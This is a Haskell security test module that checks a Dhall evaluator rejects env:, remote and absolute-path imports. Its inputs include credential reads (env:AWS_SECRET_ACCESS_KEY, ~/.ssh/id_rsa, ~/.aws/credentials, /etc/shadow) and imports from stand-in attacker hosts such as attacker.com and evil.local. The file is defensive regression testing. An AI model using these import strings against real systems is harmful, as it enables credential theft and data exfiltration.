{-# LANGUAGE OverloadedStrings #-}

-- | Security tests for sensenet
--
-- Tests for Dhall import restrictions that prevent:
-- - Credential exfiltration via env: imports
-- - Data exfiltration via remote imports
-- - Arbitrary file read via absolute paths
--
-- These are regression tests for CVE-class vulnerabilities discovered
-- during security audit. "Everyone." - Norman Stansfield
module Test.SenseNet.Security (tests) where

import Control.Exception (SomeException, try)
import Data.Text (Text)
import Data.Text qualified as T
import DhallFast.Input (DangerousImport (..), inputExpr)
import Test.Tasty
import Test.Tasty.HUnit

tests :: TestTree
tests =
  testGroup
    "Security"
    [ testGroup "env: imports" envImportTests,
      testGroup "Remote imports" remoteImportTests,
      testGroup "Absolute path imports" absolutePathTests,
      testGroup "Home directory imports" homePathTests,
      testGroup "Safe imports" safeImportTests
    ]

-- ════════════════════════════════════════════════════════════════════════════
-- env: imports - MUST be blocked
-- ════════════════════════════════════════════════════════════════════════════

envImportTests :: [TestTree]
envImportTests =
  [ testCase "env:SECRET is blocked" $ do
      result <- try @SomeException $ inputExpr "env:SECRET as Text"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "env:SECRET" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "env: import should have been blocked",
    testCase "env:AWS_SECRET_ACCESS_KEY is blocked" $ do
      result <- try @SomeException $ inputExpr "env:AWS_SECRET_ACCESS_KEY as Text"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "env:AWS_SECRET_ACCESS_KEY" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "env: import should have been blocked",
    testCase "env:HOME is blocked" $ do
      result <- try @SomeException $ inputExpr "env:HOME as Text"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "env:HOME" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "env: import should have been blocked",
    testCase "env in let binding is blocked" $ do
      result <- try @SomeException $ inputExpr "let secret = env:PASSWORD in secret"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "env:" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "env: import should have been blocked",
    testCase "env in list is blocked" $ do
      result <- try @SomeException $ inputExpr "[env:TOKEN as Text]"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "env:" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "env: import should have been blocked"
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- Remote imports - MUST be blocked
-- ════════════════════════════════════════════════════════════════════════════

remoteImportTests :: [TestTree]
remoteImportTests =
  [ testCase "https://attacker.com is blocked" $ do
      result <- try @SomeException $ inputExpr "https://attacker.com/payload as Text"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "Remote imports" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "remote import should have been blocked",
    testCase "http://evil.local is blocked" $ do
      result <- try @SomeException $ inputExpr "http://evil.local/steal as Text"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "Remote imports" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "remote import should have been blocked",
    testCase "https://prelude.dhall-lang.org is blocked" $ do
      -- Even the official Dhall prelude must be blocked for security
      result <- try @SomeException $ inputExpr "https://prelude.dhall-lang.org/Bool/and"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "Remote imports" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "remote import should have been blocked"
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- Absolute path imports - MUST be blocked
-- ════════════════════════════════════════════════════════════════════════════

absolutePathTests :: [TestTree]
absolutePathTests =
  [ testCase "/etc/passwd is blocked" $ do
      result <- try @SomeException $ inputExpr "/etc/passwd as Text"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "Absolute path" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "absolute path import should have been blocked",
    testCase "/etc/shadow is blocked" $ do
      result <- try @SomeException $ inputExpr "/etc/shadow as Text"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "Absolute path" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "absolute path import should have been blocked",
    testCase "/root/.ssh/id_rsa is blocked" $ do
      result <- try @SomeException $ inputExpr "/root/.ssh/id_rsa as Text"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "Absolute path" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "absolute path import should have been blocked"
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- Home directory imports (~/) - MUST be blocked
-- ════════════════════════════════════════════════════════════════════════════

homePathTests :: [TestTree]
homePathTests =
  [ testCase "~/.ssh/id_rsa is blocked" $ do
      result <- try @SomeException $ inputExpr "~/.ssh/id_rsa as Text"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "Absolute path" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "home path import should have been blocked",
    testCase "~/.aws/credentials is blocked" $ do
      result <- try @SomeException $ inputExpr "~/.aws/credentials as Text"
      case result of
        Left e -> assertBool "should be DangerousImport" $ "Absolute path" `T.isInfixOf` T.pack (show e)
        Right _ -> assertFailure "home path import should have been blocked"
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- Safe imports - MUST be allowed
-- ════════════════════════════════════════════════════════════════════════════

safeImportTests :: [TestTree]
safeImportTests =
  [ testCase "pure expressions work" $ do
      result <- try @SomeException $ inputExpr "1 + 1"
      case result of
        Left e -> assertFailure $ "pure expression should work: " ++ show e
        Right _ -> pure (),
    testCase "list literals work" $ do
      result <- try @SomeException $ inputExpr "[1, 2, 3]"
      case result of
        Left e -> assertFailure $ "list literal should work: " ++ show e
        Right _ -> pure (),
    testCase "record literals work" $ do
      result <- try @SomeException $ inputExpr "{ name = \"test\", value = 42 }"
      case result of
        Left e -> assertFailure $ "record literal should work: " ++ show e
        Right _ -> pure (),
    testCase "text literals work" $ do
      result <- try @SomeException $ inputExpr "\"hello world\""
      case result of
        Left e -> assertFailure $ "text literal should work: " ++ show e
        Right _ -> pure (),
    testCase "functions work" $ do
      result <- try @SomeException $ inputExpr "(\\(x : Natural) -> x + 1) 5"
      case result of
        Left e -> assertFailure $ "function application should work: " ++ show e
        Right _ -> pure ()
  ]
